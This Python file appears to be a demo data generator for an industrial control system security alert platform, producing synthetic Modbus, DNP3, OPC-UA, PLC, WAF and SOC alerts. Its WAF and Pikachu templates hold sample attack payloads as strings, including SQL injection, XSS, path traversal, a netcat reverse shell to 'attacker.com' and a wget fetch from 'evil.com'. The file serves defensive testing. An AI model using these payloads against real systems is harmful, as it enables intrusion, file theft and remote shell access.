"""
Demo 数据生成器

生成真实的 ICS 安全告警数据，用于演示和测试。
包含 Modbus/DNP3/OPC-UA 异常、未授权访问、固件变更等多种场景。

用法:
    from collector.demo_generator import DemoGenerator
    gen = DemoGenerator()
    event = gen.generate_one()  # 返回一条模拟事件 dict
"""

import json
import random
import string
from datetime import datetime, timezone, timedelta


# ---------------------------------------------------------------------------
# Network address pools
# ---------------------------------------------------------------------------
_ICS_SUBNET = "10.10.{}.{}"
_CORP_SUBNET = "192.168.1.{}"
_EXTERNAL_IPS = [
    "45.33.32.156", "185.220.101.34", "103.224.182.245",
    "198.51.100.23", "203.0.113.42", "91.219.237.15",
]
_PLC_IPS = [f"10.10.1.{i}" for i in range(10, 20)]
_HMI_IPS = [f"10.10.2.{i}" for i in range(10, 15)]
_EWS_IPS = [f"10.10.3.{i}" for i in range(10, 13)]
_SCADA_IPS = [f"10.10.4.{i}" for i in range(10, 13)]

_MODBUS_PORTS = [502]
_DNP3_PORTS = [20000]
_OPCUA_PORTS = [4840, 4843]

# ---------------------------------------------------------------------------
# Alert templates (at least 20)
# ---------------------------------------------------------------------------
ALERT_TEMPLATES = [
    # --- Modbus anomalies ---
    {
        "_source": "nids",
        "alert": {
            "signature": "Modbus 非法功能码 0x{fc:02x}",
            "signature_id": 2100001,
            "severity": 1,
            "category": "Attempted Information Leak",
        },
        "src_ip": lambda: random.choice(_EXTERNAL_IPS + [_CORP_SUBNET.format(random.randint(50, 100))]),
        "dest_ip": lambda: random.choice(_PLC_IPS),
        "src_port": lambda: random.randint(1024, 65535),
        "dest_port": lambda: 502,
        "proto": "TCP",
        "_extra": {"fc": lambda: random.choice([0x08, 0x11, 0x2B, 0x5A, 0x7F])},
    },
    {
        "_source": "nids",
        "alert": {
            "signature": "Modbus 异常写多寄存器请求 (数量超限)",
            "signature_id": 2100002,
            "severity": 2,
            "category": "Unauthorized Command",
        },
        "src_ip": lambda: _CORP_SUBNET.format(random.randint(50, 100)),
        "dest_ip": lambda: random.choice(_PLC_IPS),
        "src_port": lambda: random.randint(1024, 65535),
        "dest_port": lambda: 502,
        "proto": "TCP",
    },
    {
        "_source": "nids",
        "alert": {
            "signature": "Modbus 设备标识探测 (Read Device ID)",
            "signature_id": 2100003,
            "severity": 3,
            "category": "Reconnaissance",
        },
        "src_ip": lambda: random.choice(_EXTERNAL_IPS),
        "dest_ip": lambda: random.choice(_PLC_IPS),
        "src_port": lambda: random.randint(1024, 65535),
        "dest_port": lambda: 502,
        "proto": "TCP",
    },
    # --- DNP3 anomalies ---
    {
        "_source": "nids",
        "alert": {
            "signature": "DNP3 未授权 Cold Restart 命令",
            "signature_id": 2100010,
            "severity": 1,
            "category": "Unauthorized Command",
        },
        "src_ip": lambda: random.choice(_EXTERNAL_IPS + [_CORP_SUBNET.format(random.randint(50, 100))]),
        "dest_ip": lambda: random.choice(_PLC_IPS),
        "src_port": lambda: random.randint(1024, 65535),
        "dest_port": lambda: 20000,
        "proto": "TCP",
    },
    {
        "_source": "nids",
        "alert": {
            "signature": "DNP3 异常广播消息",
            "signature_id": 2100011,
            "severity": 2,
            "category": "Anomaly",
        },
        "src_ip": lambda: _CORP_SUBNET.format(random.randint(50, 100)),
        "dest_ip": lambda: "10.10.1.255",
        "src_port": lambda: random.randint(1024, 65535),
        "dest_port": lambda: 20000,
        "proto": "UDP",
    },
    # --- OPC-UA anomalies ---
    {
        "_source": "nids",
        "alert": {
            "signature": "OPC-UA 未授权 BrowseRequest 扫描",
            "signature_id": 2100020,
            "severity": 2,
            "category": "Reconnaissance",
        },
        "src_ip": lambda: random.choice(_EXTERNAL_IPS),
        "dest_ip": lambda: random.choice(_SCADA_IPS),
        "src_port": lambda: random.randint(1024, 65535),
        "dest_port": lambda: random.choice(_OPCUA_PORTS),
        "proto": "TCP",
    },
    {
        "_source": "nids",
        "alert": {
            "signature": "OPC-UA 大量 ReadRequest (数据窃取嫌疑)",
            "signature_id": 2100021,
            "severity": 1,
            "category": "Collection",
        },
        "src_ip": lambda: _CORP_SUBNET.format(random.randint(50, 100)),
        "dest_ip": lambda: random.choice(_SCADA_IPS),
        "src_port": lambda: random.randint(1024, 65535),
        "dest_port": lambda: 4840,
        "proto": "TCP",
    },
    # --- PLC unauthorized access ---
    {
        "_source": "hids",
        "rule": {
            "id": "100201",
            "description": "未授权PLC编程端口访问",
            "level": 13,
            "groups": ["ics", "unauthorized_access", "plc"],
        },
        "agent": {"ip": lambda: random.choice(_PLC_IPS)},
        "data": {"srcip": lambda: random.choice(_EXTERNAL_IPS)},
    },
    {
        "_source": "hids",
        "rule": {
            "id": "100202",
            "description": "PLC运行模式变更 (RUN->PROGRAM)",
            "level": 14,
            "groups": ["ics", "plc", "mode_change"],
        },
        "agent": {"ip": lambda: random.choice(_PLC_IPS)},
        "data": {"srcip": lambda: random.choice(_EWS_IPS)},
    },
    # --- Firmware change ---
    {
        "_source": "hids",
        "rule": {
            "id": "100301",
            "description": "PLC固件上传检测 - 固件变更",
            "level": 15,
            "groups": ["ics", "firmware", "critical"],
        },
        "agent": {"ip": lambda: random.choice(_PLC_IPS)},
        "data": {"srcip": lambda: random.choice(_EWS_IPS)},
    },
    # --- WAF attacks ---
    {
        "_source": "waf",
        "rule_name": "SQL注入攻击",
        "severity": "高",
        "src_ip": lambda: random.choice(_EXTERNAL_IPS),
        "dst_ip": lambda: random.choice(_SCADA_IPS + _HMI_IPS),
        "url": lambda: random.choice([
            "/api/login", "/api/query", "/scada/data",
            "/hmi/config", "/api/users",
        ]),
        "payload": lambda: random.choice([
            "' OR 1=1--", "'; DROP TABLE users;--",
            "1 UNION SELECT * FROM config--",
            "admin' AND 1=1--",
        ]),
    },
    {
        "_source": "waf",
        "rule_name": "命令注入攻击",
        "severity": "严重",
        "src_ip": lambda: random.choice(_EXTERNAL_IPS),
        "dst_ip": lambda: random.choice(_SCADA_IPS),
        "url": "/api/diagnostic",
        "payload": lambda: random.choice([
            "; cat /etc/passwd", "| nc attacker.com 4444 -e /bin/sh",
            "$(wget http://evil.com/backdoor.sh)",
            "`id`",
        ]),
    },
    {
        "_source": "waf",
        "rule_name": "暴力破解 - 登录失败",
        "severity": "高",
        "src_ip": lambda: random.choice(_EXTERNAL_IPS),
        "dst_ip": lambda: random.choice(_HMI_IPS + _SCADA_IPS),
        "url": "/api/login",
        "reason": "同一IP短时间内大量登录失败",
    },
    # --- Lateral movement ---
    {
        "_source": "nids",
        "alert": {
            "signature": "内网异常 SMB 连接 - 横向移动嫌疑",
            "signature_id": 2100030,
            "severity": 2,
            "category": "Lateral Movement",
        },
        "src_ip": lambda: _CORP_SUBNET.format(random.randint(50, 100)),
        "dest_ip": lambda: random.choice(_PLC_IPS + _HMI_IPS),
        "src_port": lambda: random.randint(1024, 65535),
        "dest_port": lambda: 445,
        "proto": "TCP",
    },
    # --- Data exfiltration ---
    {
        "_source": "nids",
        "alert": {
            "signature": "异常大量数据外传 - 数据外泄嫌疑",
            "signature_id": 2100040,
            "severity": 1,
            "category": "Exfiltration",
        },
        "src_ip": lambda: random.choice(_SCADA_IPS + _HMI_IPS),
        "dest_ip": lambda: random.choice(_EXTERNAL_IPS),
        "src_port": lambda: random.randint(1024, 65535),
        "dest_port": lambda: random.choice([443, 80, 8443]),
        "proto": "TCP",
    },
    # --- HMI unauthorized operation ---
    {
        "_source": "hids",
        "rule": {
            "id": "100401",
            "description": "HMI 未授权设定值变更",
            "level": 14,
            "groups": ["ics", "hmi", "unauthorized_change"],
        },
        "agent": {"ip": lambda: random.choice(_HMI_IPS)},
        "data": {"srcip": lambda: _CORP_SUBNET.format(random.randint(50, 100))},
    },
    # --- Engineering workstation anomaly ---
    {
        "_source": "hids",
        "rule": {
            "id": "100501",
            "description": "工程师站异常外连 - 可疑C2通信",
            "level": 12,
            "groups": ["ics", "ews", "c2", "suspicious"],
        },
        "agent": {"ip": lambda: random.choice(_EWS_IPS)},
        "data": {"srcip": lambda: random.choice(_EWS_IPS)},
    },
    # --- Safety system tampering ---
    {
        "_source": "hids",
        "rule": {
            "id": "100601",
            "description": "SIS安全仪表系统 - 未授权逻辑变更",
            "level": 15,
            "groups": ["ics", "sis", "safety", "critical"],
        },
        "agent": {"ip": lambda: "10.10.5.10"},
        "data": {"srcip": lambda: random.choice(_EWS_IPS + _EXTERNAL_IPS[:2])},
    },
    # --- Port scan ---
    {
        "_source": "nids",
        "alert": {
            "signature": "端口扫描检测 - Nmap SYN Scan",
            "signature_id": 2100050,
            "severity": 2,
            "category": "Reconnaissance",
        },
        "src_ip": lambda: random.choice(_EXTERNAL_IPS),
        "dest_ip": lambda: _ICS_SUBNET.format(random.randint(1, 4), random.randint(10, 20)),
        "src_port": lambda: random.randint(1024, 65535),
        "dest_port": lambda: random.choice([22, 80, 443, 502, 4840, 20000, 102]),
        "proto": "TCP",
    },
    # --- SCADA DoS ---
    {
        "_source": "nids",
        "alert": {
            "signature": "SCADA 服务拒绝服务攻击 (SYN Flood)",
            "signature_id": 2100060,
            "severity": 1,
            "category": "Denial of Service",
        },
        "src_ip": lambda: random.choice(_EXTERNAL_IPS),
        "dest_ip": lambda: random.choice(_SCADA_IPS),
        "src_port": lambda: random.randint(1024, 65535),
        "dest_port": lambda: random.choice([502, 4840, 80]),
        "proto": "TCP",
    },
    # --- Pikachu range ---
    {
        "_source": "pikachu",
        "vuln_type": lambda: random.choice([
            "SQL注入 (字符型)", "SQL注入 (搜索型)", "XSS (反射型)",
            "XSS (存储型)", "文件包含", "不安全的文件上传",
            "命令注入", "CSRF",
        ]),
        "payload": lambda: random.choice([
            "' OR '1'='1", "<script>alert(1)</script>",
            "../../../../etc/passwd", "; ls -la",
            "<img src=x onerror=alert(1)>",
        ]),
        "src_ip": lambda: _CORP_SUBNET.format(random.randint(100, 200)),
        "target_ip": lambda: "192.168.1.50",
    },
    # --- Generic SOC alert ---
    {
        "_source": "soc",
        "title": lambda: random.choice([
            "防火墙拒绝连接", "异常DNS查询", "VPN登录异常",
            "证书过期警告", "系统资源告警 - CPU 使用率超限",
        ]),
        "severity": lambda: random.choice(["low", "medium", "high"]),
        "src_ip": lambda: _CORP_SUBNET.format(random.randint(10, 200)),
        "dst_ip": lambda: random.choice(_EXTERNAL_IPS + _SCADA_IPS),
    },
]


def _resolve_value(value):
    """Resolve a value that may be a callable (lambda) or a static value."""
    if callable(value):
        return value()
    if isinstance(value, dict):
        return {k: _resolve_value(v) for k, v in value.items()}
    if isinstance(value, list):
        return [_resolve_value(v) for v in value]
    return value


class DemoGenerator:
    """Generate realistic ICS alert data for demo/test purposes."""

    def __init__(self, seed: int = None):
        if seed is not None:
            random.seed(seed)
        self._counter = 0

    def generate_one(self) -> dict:
        """Generate a single random event dict.

        The returned dict includes a ``_source`` key indicating the source type
        (waf/nids/hids/pikachu/soc). The caller should pop this key before
        passing to the normalizer.
        """
        template = random.choice(ALERT_TEMPLATES)
        event = {}

        for key, value in template.items():
            if key == "_extra":
                # Extra format params for string formatting in other fields
                continue
            event[key] = _resolve_value(value)

        # Handle _extra format params (e.g., Modbus function code in signature)
        if "_extra" in template:
            extras = {k: _resolve_value(v) for k, v in template["_extra"].items()}
            # Apply formatting to nested dicts
            self._format_strings(event, extras)

        # Add timestamp with some jitter
        jitter_seconds = random.randint(-300, 0)
        ts = datetime.now(timezone.utc) + timedelta(seconds=jitter_seconds)
        event["timestamp"] = ts.isoformat()

        self._counter += 1
        return event

    def generate_batch(self, count: int = 20) -> list[dict]:
        """Generate a batch of random events."""
        return [self.generate_one() for _ in range(count)]

    def _format_strings(self, obj, params: dict):
        """Recursively format string values in obj using params."""
        if isinstance(obj, dict):
            for key, value in obj.items():
                if isinstance(value, str):
                    try:
                        obj[key] = value.format(**params)
                    except (KeyError, IndexError):
                        pass
                elif isinstance(value, dict):
                    self._format_strings(value, params)
                elif isinstance(value, list):
                    for item in value:
                        if isinstance(item, dict):
                            self._format_strings(item, params)


# ---------------------------------------------------------------------------
# CLI for quick testing
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    gen = DemoGenerator(seed=42)
    events = gen.generate_batch(20)
    for i, event in enumerate(events, 1):
        source = event.get("_source", "?")
        title = (
            event.get("alert", {}).get("signature")
            or event.get("rule", {}).get("description")
            or event.get("rule_name")
            or event.get("vuln_type")
            or event.get("title")
            or "?"
        )
        if callable(title):
            title = title()
        print(f"[{i:02d}] source={source:8s} | {title}")
